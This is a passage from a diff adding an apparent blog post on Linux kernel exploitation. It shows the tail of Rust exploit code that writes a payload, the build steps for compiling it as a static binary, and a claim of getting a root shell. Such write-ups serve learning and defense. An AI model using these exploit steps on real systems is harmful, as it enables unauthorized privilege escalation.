+</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">{:04x}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">u32</span>::from_le_bytes(chunk.try_into().unwrap())); 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    f.write_all(<span style="color:#f92672">&amp;</span>payload).unwrap();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Thanks to Rust building system, we can easely compile the exploit as a static binary for the target system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mkdir exploit <span style="color:#f92672">&amp;&amp;</span> cd exploit
+</span></span><span style="display:flex;"><span>cargo init .
+</span></span><span style="display:flex;"><span>cargo add libc
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># copy code to src/main.rs</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># make sure target is available</span>
+</span></span><span style="display:flex;"><span>rustup target add i686-unknown-linux-musl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># build</span>
+</span></span><span style="display:flex;"><span>cargo build --target i686-unknown-linux-musl --release
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then upload the binary to the target system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># binary is found at ./target/i686-unknown-linux-musl/release/exploit</span>
+</span></span></code></pre></div><p>Then we run the binary and get a root shell !</p>
+<p><img alt="Got root" src="/img/pwn-linkern-rop/got-root.png"></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/ctf-htb-cyberapocalypse-2025/" class="button inline prev">
+        Ctf Htb Cyberapocalypse 2025
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/pwn-linkern-stack/" class="button inline next">
+        Pwn: Linux Kernel x86 - Basic Buffer Overflow
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
